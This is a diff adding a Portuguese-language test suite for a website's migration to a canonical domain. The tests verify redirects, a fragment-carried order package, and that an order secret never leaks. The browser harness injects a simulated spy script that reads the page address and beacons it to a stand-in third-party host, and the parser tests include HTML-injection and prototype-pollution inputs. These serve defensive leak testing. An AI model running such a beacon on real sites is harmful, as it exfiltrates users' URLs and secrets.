@@ -1,0 +1,569 @@
+/*
+ * Porta Aberta · endereço único (pacote H1, Pixel, 11/11/2026).
+ * Roda com: CREAT_TESTE_TMP=/tmp npm test   (ou node --test scripts/testes/endereco.test.mjs)
+ *
+ * O canônico é https://nuvem.creatmtt.com.br. Quem abre o endereço antigo vai ao mesmo caminho, consulta e
+ * fragmento no canônico (assets/canonico.js), levando o pedido e a escolha de medição no fragmento de transição.
+ *
+ * 1. Sem navegador: configuração, pacote (ida e volta, falha fechada), listas iguais às de vitrine.js, ordem dos
+ *    scripts no <head> das 8 páginas e da prévia, canonical e og:url, e o host antigo só na lista de antigos.
+ * 2. Com navegador de verdade (Playwright): os dois hosts reais servidos da pasta pública local (a lista ENTRA
+ *    de scripts/montar-publico.cjs) por roteamento do contexto, com a origem de cada um isolada como no ar
+ *    (localStorage por origem). Terceiros simulados e capturados (endereço, Referer e o endereço da página na hora).
+ */
+import test from 'node:test';
+import assert from 'node:assert/strict';
+import fs from 'node:fs';
+import path from 'node:path';
+import http from 'node:http';
+import { createRequire } from 'node:module';
+import { fileURLToPath, pathToFileURL } from 'node:url';
+
+const require = createRequire(import.meta.url);
+const RAIZ = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
+const C = require(path.join(RAIZ, 'assets', 'canonico.js'));
+const { ENTRA } = require(path.join(RAIZ, 'scripts', 'montar-publico.cjs'));
+const FONTE_CK = fs.readFileSync(path.join(RAIZ, 'checkout.config.js'), 'utf8');
+const FONTE_VIT = fs.readFileSync(path.join(RAIZ, 'assets', 'vitrine.js'), 'utf8');
+
+const HA = 'creat-nuvem-404b1994.base44.app', HN = 'nuvem.creatmtt.com.br', HO = 'outro.exemplo';
+const A = 'https://' + HA, N = 'https://' + HN, O = 'https://' + HO;
+const SEGREDO = 'q1Zr8Xn4Lw0bT6yHc9VfEA', ID = 'PA-7K3QX2MD4R';
+const PREF_FEIRA = '2189692475-c33953d5-4c69-4bc9-8de8-0ff4d7dfbeff';
+const PAGINAS = ['index.html', 'abrir/index.html', 'obrigado/index.html', 'termos/index.html', 'privacidade/index.html', 'bastidores/index.html', '404.html', 'previa/index.html'];
+const H = 3600 * 1000;
+
+const PEDIDO_CHEIO = (o = {}) => Object.assign({
+  id: ID, segredo: SEGREDO, produto: 'pa-abertura-inauguracao-2026-11', valor: 297, praca: 'feira',
+  link: 'https://www.mercadopago.com.br/checkout/v1/redirect?pref_id=' + PREF_FEIRA, plano: 'vitrine', nicho: 'salao', negocio: 'Studio Bela & Cia', cidade: 'Feira de Santana',
+  responsavel: 'Maria Souza', whatsapp_negocio: '5575991234567', endereco: 'Rua das Flores, 120, Centro, Feira de Santana-BA, 44001-000',
+  horarios: 'seg=09:00-18:00;ter=09:00-18:00;qua=09:00-18:00;qui=09:00-18:00;sex=09:00-18:00;sab=09:00-13:00;dom=fechado',
+  email: 'maria@exemplo.com.br', origem: 'utm_source=meta;utm_campaign=feira;utm_content=A1-salao-v1', previa: N + '/previa/#k=salao&n=Studio&p=1',
+  aceite_termos: '2026-11-10T10:00:00-03:00 termos-v2', paleta: 1, salvo_em: new Date(Date.now() - H).toISOString(), status: 'enviado'
+}, o);
+const EM = new Date(Math.floor((Date.now() - 2 * H) / 1000) * 1000).toISOString();
+const CONSENT = (pixel) => ({ versao: 1, analytics: true, pixel, clarity: pixel, em: EM });
+const PESSOAIS = /Maria Souza|5575991234567|maria@exemplo|Rua das Flores|seg=09/;
+
+// Memória de localStorage simples, para a parte sem navegador.
+function memoria(inicial = {}) {
+  const m = new Map(Object.entries(inicial));
+  return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k), _m: m };
+}
+const cfg = () => C.configuracao({ canonico: N, antigos: [HA] });
+const loc = (u) => { const x = new URL(u); return { pathname: x.pathname, search: x.search, hash: x.hash, hostname: x.hostname, protocol: x.protocol }; };
+const fragDe = (url) => url.slice(url.indexOf('#') + 1);
+
+/* ======================================================================== 1. sem navegador */
+
+test('H1 configuração: canônico https sem caminho; o próprio canônico nunca entra na lista de antigos (sem laço)', () => {
+  assert.deepEqual(cfg(), { origem: N, host: HN, antigos: [HA] });
+  assert.deepEqual(C.configuracao({ canonico: N, antigos: [HA, HN, 'Ruim Host', 3] }).antigos, [HA]);
+  for (const ruim of ['http://' + HN, N + '/x', N + ':8443', 'https://u:s@' + HN, N + '/?a=1', 'nada', '']) assert.equal(C.configuracao({ canonico: ruim, antigos: [HA] }), null, ruim);
+  assert.equal(C.configuracao(null), null);
+  assert.equal(C.configuracao({ canonico: N }), null);
+});
+
+test('H1 checkout.config.js: endereço canônico e lista de antigos, iguais em CREAT_CHECKOUT.endereco e CREAT_ENDERECO', async () => {
+  const vm = await import('node:vm');
+  const ctx = { window: {} }; vm.createContext(ctx); vm.runInContext(FONTE_CK, ctx);
+  assert.equal(ctx.window.CREAT_ENDERECO.canonico, N);
+  assert.deepEqual(Array.from(ctx.window.CREAT_ENDERECO.antigos), [HA]);
+  assert.equal(ctx.window.CREAT_CHECKOUT.endereco, ctx.window.CREAT_ENDERECO);
+});
+
+test('H1 listas de canonico.js iguais às de vitrine.js (planos, nichos, praças e catálogo)', () => {
+  const lista = (nome) => JSON.parse(FONTE_VIT.match(new RegExp('var ' + nome + " = (\\[[^\\]]*\\])"))[1].replace(/'/g, '"'));
+  assert.deepEqual(C.PLANOS, lista('PLANOS'));
+  assert.deepEqual(C.NICHOS, lista('NICHOS'));
+  assert.deepEqual(C.PRACAS, lista('PRACAS'));
+  const cat = FONTE_VIT.match(/var CATALOGO = (\{[^}]*\})/)[1].replace(/'/g, '"');
+  assert.deepEqual(C.CATALOGO, JSON.parse(cat));
+  // os formatos do id e do segredo são os do servidor (schema/pedido-regras.mjs, via vitrine.js)
+  assert.ok(FONTE_VIT.includes("RE_ID = /^PA-[0-9A-Z]{10}$/") && FONTE_VIT.includes("RE_SEGREDO = /^[A-Za-z0-9_-]{21}[AQgw]$/"));
+});
+
+test('H1 pacote: só id, segredo e o enxuto do pedido e a escolha de medição; nenhum dado pessoal; ida e volta exata', () => {
+  const ls = memoria({ 'creat:pedido:v1': JSON.stringify(PEDIDO_CHEIO()), 'creat:consentimento': JSON.stringify(CONSENT(false)) });
+  const url = C.destino(cfg(), loc(A + '/obrigado/?payment_id=188866285972&resultado=aprovado#k=salao'), ls);
+  assert.ok(url.startsWith(N + '/obrigado/?payment_id=188866285972&resultado=aprovado#m=v1.'), url);
+  assert.ok(url.endsWith('~k=salao'), 'fragmento original no fim');
+  const antes = url.slice(0, url.indexOf('#'));
+  assert.ok(!antes.includes(SEGREDO), 'segredo nunca no caminho nem na consulta');
+  const tr = C.lerTransicao(fragDe(url));
+  assert.equal(tr.original, 'k=salao');
+  assert.deepEqual(Object.keys(tr.pacote).sort(), ['c', 'p', 'v']);
+  assert.deepEqual(Object.keys(tr.pacote.p).sort(), ['c', 'i', 'k', 'n', 'pc', 'pl', 'pr', 's', 'st', 't', 'va']);
+  assert.equal(tr.pacote.p.i, ID); assert.equal(tr.pacote.p.s, SEGREDO); assert.equal(tr.pacote.c.x, false);
+  assert.doesNotMatch(C.deB64(fragDe(url).slice(5).split('~')[0]), PESSOAIS);
+  assert.ok(fragDe(url).split('~')[0].length < 450, 'pacote pequeno: ' + fragDe(url).length);
+  // nada a levar: o fragmento original passa sozinho; sem fragmento, sem '#'
+  assert.equal(C.destino(cfg(), loc(A + '/?utm_source=meta#k=salao'), memoria()), N + '/?utm_source=meta#k=salao');
+  assert.equal(C.destino(cfg(), loc(A + '/termos/'), memoria()), N + '/termos/');
+  // chegou no antigo com um fragmento de transição: nunca empilha
+  assert.equal(C.destino(cfg(), loc(A + '/#m=v1.QUFB~k=salao'), memoria()), N + '/#k=salao');
+  // pedido antigo de 8 sem segredo, pedido vencido e consentimento de 181 dias não viajam
+  const velho = memoria({ 'creat:pedido:v1': JSON.stringify(PEDIDO_CHEIO({ id: 'PA-ABCDEFGH', segredo: undefined })), 'creat:consentimento': JSON.stringify(Object.assign(CONSENT(true), { em: new Date(Date.now() - 181 * 24 * H).toISOString() })) });
+  assert.equal(C.montarPacote(velho), '');
+  assert.equal(C.montarPacote(memoria({ 'creat:pedido:v1': JSON.stringify(PEDIDO_CHEIO({ salvo_em: new Date(Date.now() - 31 * 24 * H).toISOString() })) })), '');
+  // cidade fora da regra sai sozinha; o pedido continua
+  const p2 = C.lerTransicao(C.montarPacote(memoria({ 'creat:pedido:v1': JSON.stringify(PEDIDO_CHEIO({ cidade: '<b>x</b>' })) }))).pacote.p;
+  assert.equal('c' in p2, false); assert.equal(p2.i, ID);
+});
+
+test('H1 pacote: falha fechada em formato, tamanho, chave extra, tipo, id, segredo, data e protótipo', () => {
+  const bom = { v: 1, p: { i: ID, s: SEGREDO, pl: 'vitrine', k: 'salao', n: 'Studio Bela & Cia', st: 'enviado', t: Math.floor(Date.now() / 1000) - 60 } };
+  const f = (o) => 'm=v1.' + C.paraB64(typeof o === 'string' ? o : JSON.stringify(o));
+  assert.ok(C.lerTransicao(f(bom)).pacote, 'o bom passa');
+  const ruins = {
+    'chave extra no topo': Object.assign({}, bom, { z: 1 }),
+    'chave extra no pedido': { v: 1, p: Object.assign({}, bom.p, { whatsapp: '5575991234567' }) },
+    'versão 2': Object.assign({}, bom, { v: 2 }),
+    'sem nada': { v: 1 },
+    'id curto': { v: 1, p: Object.assign({}, bom.p, { i: 'PA-ABCDEFGH' }) },
+    'id com minúscula': { v: 1, p: Object.assign({}, bom.p, { i: 'PA-7k3qx2md4r' }) },
+    'segredo errado': { v: 1, p: Object.assign({}, bom.p, { s: SEGREDO.slice(0, 21) + 'B' }) },
+    'segredo número': { v: 1, p: Object.assign({}, bom.p, { s: 123 }) },
+    'plano fora': { v: 1, p: Object.assign({}, bom.p, { pl: 'gratis' }) },
+    'nome com <': { v: 1, p: Object.assign({}, bom.p, { n: '<img src=x>' }) },
+    'nome de 41': { v: 1, p: Object.assign({}, bom.p, { n: 'A'.repeat(41) }) },
+    'valor trocado': { v: 1, p: Object.assign({}, bom.p, { pr: 'pa-abertura-2026-11', va: 1 }) },
+    'status fora': { v: 1, p: Object.assign({}, bom.p, { st: 'pago' }) },
+    'data no futuro': { v: 1, p: Object.assign({}, bom.p, { t: Math.floor(Date.now() / 1000) + 3600 }) },
+    'data velha': { v: 1, p: Object.assign({}, bom.p, { t: Math.floor(Date.now() / 1000) - 31 * 86400 }) },
+    'consentimento texto': { v: 1, c: { x: 'true', t: Math.floor(Date.now() / 1000) } },
+    'consentimento com chave extra': { v: 1, c: { x: true, t: Math.floor(Date.now() / 1000), y: 1 } },
+    'lista': [bom],
+    'protótipo': '{"v":1,"__proto__":{"x":1},"c":{"x":true,"t":' + Math.floor(Date.now() / 1000) + '}}',
+    'json quebrado': '{"v":1,'
+  };
+  for (const [nome, o] of Object.entries(ruins)) assert.equal(C.lerTransicao(f(o)).pacote, null, nome);
+  assert.equal(C.lerTransicao('m=v1.' + 'A'.repeat(C.MAX_B64 + 1)).pacote, null, 'gigante');
+  assert.equal(C.lerTransicao('m=v1.@@@~k=salao').pacote, null, 'fora do alfabeto');
+  assert.equal(C.lerTransicao('m=v1.@@@~k=salao').original, 'k=salao', 'o original sobrevive ao pacote ruim');
+  assert.equal(C.lerTransicao('m=v9.QUFB').pacote, null, 'versão desconhecida');
+  assert.equal(C.lerTransicao('k=salao'), null, 'fragmento comum não é transição');
+});
+
+test('H1 aplicar: o do canônico vence; só grava onde está vago; pedido gravado é enxuto e o leitor da vitrine aceita', async () => {
+  const pac = C.lerTransicao(C.montarPacote(memoria({ 'creat:pedido:v1': JSON.stringify(PEDIDO_CHEIO()), 'creat:consentimento': JSON.stringify(CONSENT(true)) }))).pacote;
+  const vazio = memoria();
+  assert.deepEqual(C.aplicar(pac, vazio), { pedido: true, consentimento: true });
+  const p = JSON.parse(vazio.getItem('creat:pedido:v1'));
+  assert.equal(p.enxuto, true); assert.equal(p.id, ID); assert.equal(p.segredo, SEGREDO);
+  assert.doesNotMatch(vazio.getItem('creat:pedido:v1'), PESSOAIS);
+  assert.equal(JSON.parse(vazio.getItem('creat:consentimento')).pixel, true);
+  const outro = PEDIDO_CHEIO({ id: 'PA-AAAAAAAAAA' });
+  const cheio = memoria({ 'creat:pedido:v1': JSON.stringify(outro), 'creat:consentimento': JSON.stringify(CONSENT(false)) });
+  assert.deepEqual(C.aplicar(pac, cheio), { pedido: false, consentimento: false });
+  assert.equal(JSON.parse(cheio.getItem('creat:pedido:v1')).id, 'PA-AAAAAAAAAA');
+  assert.equal(JSON.parse(cheio.getItem('creat:consentimento')).pixel, false);
+});
+
+test('H1 <head>: checkout.config.js e canonico.js sem defer antes de qualquer outro script e folha de estilo, nas 8 páginas e na prévia', () => {
+  for (const f of PAGINAS) {
+    const h = fs.readFileSync(path.join(RAIZ, f), 'utf8');
+    const cab = h.slice(0, h.indexOf('</head>'));
+    const tags = [...cab.matchAll(/<(script|link)\b[^>]*>/g)].map((m) => m[0]).filter((t) => !/application\/ld\+json/.test(t));
+    assert.match(tags[0], /^<script src="(\.\.\/|\/)?checkout\.config\.js">$/, f + ': 1º ' + tags[0]);
+    assert.match(tags[1], /^<script src="(\.\.\/|\/)?assets\/canonico\.js">$/, f + ': 2º ' + tags[1]);
+    assert.ok(!/defer|async|type="module"/.test(tags[0] + tags[1]), f);
+    assert.equal((h.match(/<script[^>]*checkout\.config\.js/g) || []).length, 1, f + ': checkout.config.js uma vez só');
+    // nenhum script inline novo que rode (dados estruturados não rodam)
+    assert.equal([...h.matchAll(/<script(?![^>]*\bsrc=)(?![^>]*application\/ld\+json)[^>]*>/g)].length, 0, f + ': script inline');
+  }
+  const esperado = { 'index.html': '/', 'abrir/index.html': '/abrir/', 'obrigado/index.html': '/obrigado/', 'termos/index.html': '/termos/', 'privacidade/index.html': '/privacidade/', 'bastidores/index.html': '/bastidores/' };
+  for (const [f, cam] of Object.entries(esperado)) {
+    const h = fs.readFileSync(path.join(RAIZ, f), 'utf8');
+    assert.ok(h.includes(`<link rel="canonical" href="${N}${cam}">`), f + ': canonical');
+    assert.ok(h.includes(`<meta property="og:url" content="${N}${cam}">`), f + ': og:url');
+  }
+  const home = fs.readFileSync(path.join(RAIZ, 'index.html'), 'utf8');
+  assert.ok(home.includes(`<meta property="og:image" content="${N}/assets/img/sede-ilha.webp">`));
+  const ld = JSON.parse(home.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/)[1]);
+  assert.ok(ld['@graph'].every((x) => x.url === N + '/'));
+});
+
+test('H1 o host antigo só existe na lista de antigos, nos arquivos do pacote', () => {
+  const arquivos = PAGINAS.concat(['assets/vitrine.js', 'assets/canonico.js', 'previa/previa.js', 'checkout.config.js', '_headers']);
+  for (const f of arquivos) {
+    const linhas = fs.readFileSync(path.join(RAIZ, f), 'utf8').split('\n').filter((l) => l.includes(HA));
+    if (f === 'checkout.config.js') assert.deepEqual(linhas.map((l) => l.trim()), ["antigos: ['" + HA + "']"], f);
+    else assert.deepEqual(linhas, [], f);
+  }
+});
+
+/* ======================================================================== 2. no navegador */
+let chromium = null;
+try { ({ chromium } = require(require.resolve('playwright', { paths: [RAIZ] }))); } catch (e) { chromium = null; }
+const pular = !chromium && 'sem Playwright';
+
+const MIME = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.webp': 'image/webp', '.png': 'image/png', '.jpg': 'image/jpeg', '.mp3': 'audio/mpeg', '.woff2': 'font/woff2' };
+const CSP = fs.readFileSync(path.join(RAIZ, '_headers'), 'utf8').match(/^\/\*\n\s+Content-Security-Policy: (.+)$/m)[1];
+const TOPO = new Set(ENTRA.map((e) => e.split('/')[0]));
+
+// Arquivo da pasta pública (só o que montar-publico.cjs publica), como o host serve.
+function arquivo(caminho) {
+  const rel = decodeURIComponent(caminho).replace(/^\/+/, '');
+  if (rel && (!TOPO.has(rel.split('/')[0]) || rel.split('/').some((p) => p.startsWith('.') || p === '..') || /\.(cjs|mjs)$/.test(rel) || /README\.md$/i.test(rel))) return null;
+  let f = path.join(RAIZ, rel);
+  if (!f.startsWith(RAIZ)) return null;
+  if (fs.existsSync(f) && fs.statSync(f).isDirectory()) f = path.join(f, 'index.html');
+  return fs.existsSync(f) ? f : null;
+}
+
+async function abrir(nav, opcoes = {}) {
+  const ctx = await nav.newContext(Object.assign({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, ignoreHTTPSErrors: true }, opcoes.contexto || {}));
+  const reg = { reqs: [], terceiros: [], navs: [], api: [], erros: [], console: [] };
+  ctx.on('request', (q) => {
+    const principal = q.isNavigationRequest() && !q.frame().parentFrame();
+    reg.reqs.push({ url: q.url(), referer: q.headers().referer || '', nav: principal, host: new URL(q.url()).hostname });
+    if (principal) reg.navs.push(q.url());   // documentos carregados na aba (replaceState não conta)
+  });
+  await ctx.route('**/*', async (r) => {
+    const q = r.request(), u = new URL(q.url());
+    if ([HA, HN, HO].includes(u.hostname)) {
+      if (opcoes.prenderNovo && u.hostname === HN) return new Promise(() => {});   // a troca nunca completa
+      if (u.pathname === '/__semente') return r.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>semente</title><p>semente</p>' });
+      if (u.pathname.startsWith('/api/pa/')) {
+        const nome = u.pathname.slice('/api/pa/'.length);
+        let corpo = null; try { corpo = JSON.parse(q.postData() || 'null'); } catch (e) { corpo = 'invalido'; }
+        reg.api.push({ host: u.hostname, nome, corpo });
+        const resp = opcoes.api && opcoes.api[nome];
+        if (resp) return r.fulfill({ status: resp.status, contentType: 'application/json', body: JSON.stringify(resp.json || {}) });
+        if (nome === 'contar') return r.fulfill({ status: 204, body: '' });
+        return r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(nome === 'consultarPedido' ? { ok: true, status: 'aguardando_pagamento' } : nome === 'confirmarPagamento' ? { ok: false, motivo: 'nao_confirmado' } : { ok: true }) });
+      }
+      if (opcoes.config && u.pathname === '/checkout.config.js') return r.fulfill({ status: 200, contentType: 'text/javascript', body: FONTE_CK.replace("antigos: ['" + HA + "']", 'antigos: ' + JSON.stringify(opcoes.config)) });
+      const f = arquivo(u.pathname);
+      const cab = opcoes.csp ? { 'content-security-policy': CSP } : {};
+      if (!f) return r.fulfill({ status: 404, headers: Object.assign({ 'content-type': MIME['.html'] }, cab), body: fs.readFileSync(path.join(RAIZ, '404.html')) });
+      if (/dados[\\/](precos|vagas)\.json$/.test(f)) { const o = JSON.parse(fs.readFileSync(f, 'utf8')); o.atualizado_em = new Date(Date.now() - H).toISOString(); return r.fulfill({ status: 200, contentType: MIME['.json'], body: JSON.stringify(o) }); }
+      let corpo = fs.readFileSync(f);
+      // O Base44 injeta scripts dele no fim do <head>. O espião faz o mesmo: lê o endereço e manda a um terceiro.
+      if (opcoes.espiao && f.endsWith('.html')) corpo = corpo.toString('utf8').replace('</head>', '<script src="https://terceiro.exemplo/espiao.js"></script></head>');
+      return r.fulfill({ status: 200, headers: Object.assign({ 'content-type': MIME[path.extname(f)] || 'application/octet-stream' }, cab), body: corpo });
+    }
+    // terceiro: registra o endereço, o Referer e o endereço da página no momento da requisição
+    let naHora = ''; try { naHora = q.frame().url(); } catch (e) {}
+    reg.terceiros.push({ url: q.url(), referer: q.headers().referer || '', naHora, tipo: q.resourceType() });
+    if (u.hostname === 'terceiro.exemplo' && u.pathname === '/espiao.js') return r.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.__espiao=location.href;(new Image()).src="https://terceiro.exemplo/px?u="+encodeURIComponent(location.href);' });
+    if (/mercadopago\.com\.br$/.test(u.hostname)) return r.fulfill({ status: 200, contentType: 'text/html', body: '<p>mp</p>' });
+    return r.fulfill({ status: 200, contentType: /fonts\.googleapis/.test(u.hostname) ? 'text/css' : 'text/javascript', body: '' });
+  });
+  const pg = await ctx.newPage();
+  pg.on('pageerror', (e) => reg.erros.push(e.message));
+  pg.on('console', (m) => { if (m.type() === 'error') reg.console.push(m.text()); });
+  return { ctx, pg, reg };
+}
+// grava no localStorage de uma origem sem passar pela vitrine (página semente, sem canonico.js)
+async function semear(pg, origem, dados) {
+  await pg.goto(origem + '/__semente');
+  await pg.evaluate((d) => { localStorage.clear(); for (const [k, v] of Object.entries(d)) localStorage.setItem(k, JSON.stringify(v)); }, dados);
+}
+async function lerLS(pg, origem) {
+  await pg.goto(origem + '/__semente');
+  return pg.evaluate(() => Object.fromEntries(Object.keys(localStorage).map((k) => [k, localStorage.getItem(k)])));
+}
+const pausa = (ms) => new Promise((ok) => setTimeout(ok, ms));
+const estadoObrigado = (pg, t) => pg.waitForFunction((x) => document.querySelector('main').getAttribute('data-texto') === x, t, { timeout: 15000 });
+const semSegredo = (reg, rotulo) => {
+  for (const q of reg.reqs) {
+    const semFrag = q.url.split('#')[0];
+    assert.ok(!semFrag.includes(SEGREDO), rotulo + ': segredo no endereço de ' + semFrag);
+    assert.ok(!q.referer.includes(SEGREDO) && !q.referer.includes('m=v1'), rotulo + ': segredo no Referer de ' + semFrag);
+  }
+  for (const t of reg.terceiros) {
+    assert.ok(!t.url.includes(SEGREDO) && !decodeURIComponent(t.url).includes(SEGREDO), rotulo + ': segredo em ' + t.url);
+    // Folha de estilo, fonte e arquivo de script declarados no HTML saem pelo leitor antecipado do navegador antes de qualquer
+    // script rodar: baixar não executa código, e o Referer leva só a origem (o fragmento nunca vai no Referer). O que o código
+    // de terceiro manda ao rodar (imagem, fetch, beacon) só pode sair com a barra já limpa; o espião prova o que ele vê ao rodar.
+    if (!/^(stylesheet|font|script)$/.test(t.tipo)) assert.ok(!t.naHora.includes('m=v1') && !t.naHora.includes(SEGREDO), rotulo + ': a barra ainda tinha o fragmento de transição quando ' + t.url + ' (' + t.tipo + ') saiu');
+  }
+};
+
+test('H1 navegador: antigo com utm vai ao novo com utm, mesmo caminho e fragmento; uma troca só, sem laço', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const { ctx, pg, reg } = await abrir(nav);
+    await pg.goto(A + '/?utm_source=meta&utm_medium=pago&utm_campaign=feira&utm_content=A1-salao-v1');
+    await pg.waitForURL((u) => u.hostname === HN);
+    await pg.waitForFunction(() => document.documentElement.classList.contains('js-pronto'));
+    await pausa(1500);
+    const u = new URL(pg.url());
+    assert.equal(u.origin, N); assert.equal(u.pathname, '/');
+    assert.equal(u.search, '?utm_source=meta&utm_medium=pago&utm_campaign=feira&utm_content=A1-salao-v1');
+    assert.deepEqual(reg.navs.map((x) => new URL(x).hostname), [HA, HN], 'uma troca só: ' + reg.navs.join(' > '));
+    // no antigo nada mediu, contou nem carregou terceiro antes de trocar
+    assert.equal(reg.api.filter((a) => a.host === HA).length, 0, 'contador no antigo');
+    assert.deepEqual(reg.erros, []);
+    // caminho, consulta e fragmento numa página comum
+    await pg.goto(A + '/termos/?teste=1#preferencias');
+    await pg.waitForURL((x) => x.hostname === HN);
+    assert.equal(pg.url(), N + '/termos/?teste=1#preferencias');
+    // prévia aberta direto no antigo (link copiado antes da troca) e rota que não existe
+    await pg.goto(A + '/previa/#k=salao&n=Studio%20Bela&c=Salvador&p=2');
+    await pg.waitForURL((x) => x.hostname === HN);
+    assert.equal(pg.url(), N + '/previa/#k=salao&n=Studio%20Bela&c=Salvador&p=2');
+    await pg.waitForSelector('#motor-raiz header, #motor-raiz .hero, #motor-raiz h1', { timeout: 15000 });
+    const r404 = await pg.goto(A + '/nao-existe/?x=1');
+    await pg.waitForURL((x) => x.hostname === HN);
+    assert.equal(new URL(pg.url()).pathname, '/nao-existe/');
+    assert.ok(r404);
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: /obrigado/ com payment_id e resultado no antigo chega igual no novo e acha o pedido salvo no antigo; o segredo nunca vaza', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const prazo = new Date(Date.now() + 71 * H).toISOString();
+    const { ctx, pg, reg } = await abrir(nav, { espiao: true, api: {
+      confirmarPagamento: { status: 200, json: { ok: true, status: 'pago' } },
+      consultarPedido: { status: 200, json: { ok: true, status: 'pago', prazo_fim: prazo, entrega_prevista_em: prazo } }
+    } });
+    await semear(pg, A, { 'creat:pedido:v1': PEDIDO_CHEIO(), 'creat:consentimento': CONSENT(true) });
+    await semear(pg, N, {});
+    reg.reqs.length = 0; reg.terceiros.length = 0; reg.navs.length = 0;
+    const q = '?pago=mp&produto=pa-abertura-inauguracao&praca=feira&payment_id=188866285972&resultado=aprovado&payment_type=bank_transfer&preference_id=' + PREF_FEIRA;
+    await pg.goto(A + '/obrigado/' + q);
+    await pg.waitForURL((x) => x.hostname === HN);
+    await estadoObrigado(pg, 'aprovado');
+    const chegada = reg.reqs.find((x) => x.nav && x.host === HN);
+    assert.equal(new URL(chegada.url).pathname + new URL(chegada.url).search, '/obrigado/' + q, 'a consulta chega igual no novo');
+    assert.equal(await pg.textContent('#pedido-id'), ID, 'o pedido salvo no antigo aparece no novo');
+    assert.equal(await pg.textContent('#obrigado-negocio'), 'Studio Bela & Cia');
+    const conf = reg.api.find((x) => x.nome === 'confirmarPagamento');
+    assert.equal(conf.host, HN);
+    assert.deepEqual(conf.corpo, { payment_id: '188866285972', pedido_id: ID, segredo: SEGREDO }, 'o segredo só no corpo da rota que já o recebe');
+    // o fragmento de transição sumiu da barra antes de qualquer terceiro (Pixel, espião no fim do <head>)
+    assert.doesNotMatch(pg.url(), /m=v1|#/);
+    const espiao = await pg.evaluate(() => window.__espiao);
+    assert.ok(espiao && espiao.startsWith(N + '/obrigado/'), 'o espião rodou: ' + espiao);
+    assert.doesNotMatch(espiao, /m=v1/);
+    assert.ok(!espiao.includes(SEGREDO));
+    assert.ok(reg.terceiros.some((t) => /connect\.facebook\.net/.test(t.url)), 'o Pixel carregou (consentimento veio do antigo)');
+    assert.ok(reg.terceiros.some((t) => /terceiro\.exemplo\/px/.test(t.url)));
+    semSegredo(reg, 'obrigado');
+    // no novo: pedido enxuto, sem dado pessoal; no antigo: nada apagado
+    const novo = await lerLS(pg, N);
+    assert.match(novo['creat:pedido:v1'], /"enxuto":true/); assert.doesNotMatch(novo['creat:pedido:v1'], PESSOAIS);
+    const antigo = await lerLS(pg, A);
+    assert.deepEqual(JSON.parse(antigo['creat:pedido:v1']), PEDIDO_CHEIO({ salvo_em: JSON.parse(antigo['creat:pedido:v1']).salvo_em }), 'o antigo continua com o pedido inteiro');
+    assert.ok(antigo['creat:consentimento']);
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: os estados de /obrigado/ chegando pelo antigo (aprovado a conferir, recusado, pendente, sem retorno, assinatura, anual, Bastidores)', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const casos = [
+      ['?pago=mp&produto=pa-abertura-inauguracao&collection_status=approved&payment_id=123', 'a_conferir'],
+      ['?pago=mp&produto=pa-abertura-inauguracao&collection_status=rejected&payment_id=123', 'recusado'],
+      ['?pago=mp&produto=pa-abertura-inauguracao&resultado=pendente', 'pendente'],
+      ['', 'sem_retorno'],
+      ['?assinatura=ok&plano=aberto', 'assinatura_ok'],
+      ['?pago=mp&produto=pa-anual-aberto&collection_status=approved&payment_id=123', 'anual_conferir'],
+      ['?pago=mp&produto=pa-bastidores&collection_status=approved&payment_id=123', 'bastidores_conferir'],
+      ['?pago=mp&produto=pa-teste&collection_status=approved&payment_id=444555667&preference_id=' + PREF_FEIRA, 'teste_ok', { consultarPedido: { status: 200, json: { ok: true, status: 'teste_ok' } }, confirmarPagamento: { status: 200, json: { ok: true, status: 'teste_ok' } } }]
+    ];
+    for (const [q, texto, api] of casos) {
+      const { ctx, pg, reg } = await abrir(nav, { api });
+      if (texto === 'teste_ok') await semear(pg, A, { 'creat:pedido:v1': PEDIDO_CHEIO() });
+      reg.reqs.length = 0;
+      await pg.goto(A + '/obrigado/' + q);
+      await pg.waitForURL((x) => x.hostname === HN);
+      await estadoObrigado(pg, texto);
+      const chegada = reg.reqs.find((x) => x.nav && x.host === HN);
+      assert.equal(new URL(chegada.url).search, q, texto + ': consulta igual');
+      assert.doesNotMatch(pg.url(), /payment_id|collection|resultado|assinatura|m=v1/, texto + ': endereço limpo no novo');
+      assert.deepEqual(reg.erros, [], texto);
+      await ctx.close();
+    }
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: pedido e consentimento que já existem no novo não são sobrescritos', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const { ctx, pg, reg } = await abrir(nav);
+    const doNovo = PEDIDO_CHEIO({ id: 'PA-AAAAAAAAAA', segredo: 'AAAAAAAAAAAAAAAAAAAAAA', negocio: 'Barbearia do Novo', nicho: 'barbearia' });
+    await semear(pg, N, { 'creat:pedido:v1': doNovo, 'creat:consentimento': CONSENT(false) });
+    await semear(pg, A, { 'creat:pedido:v1': PEDIDO_CHEIO(), 'creat:consentimento': CONSENT(true) });
+    await pg.goto(A + '/obrigado/?pago=mp&produto=pa-abertura-inauguracao&resultado=pendente');
+    await pg.waitForURL((x) => x.hostname === HN);
+    await estadoObrigado(pg, 'pendente');
+    assert.equal(await pg.textContent('#pedido-id'), 'PA-AAAAAAAAAA');
+    const ls = await lerLS(pg, N);
+    assert.equal(JSON.parse(ls['creat:pedido:v1']).id, 'PA-AAAAAAAAAA');
+    assert.equal(JSON.parse(ls['creat:consentimento']).pixel, false);
+    assert.equal(reg.terceiros.filter((t) => /facebook/.test(t.url)).length, 0, 'a recusa do novo vale');
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+  } finally { await nav.close(); }
+});
+
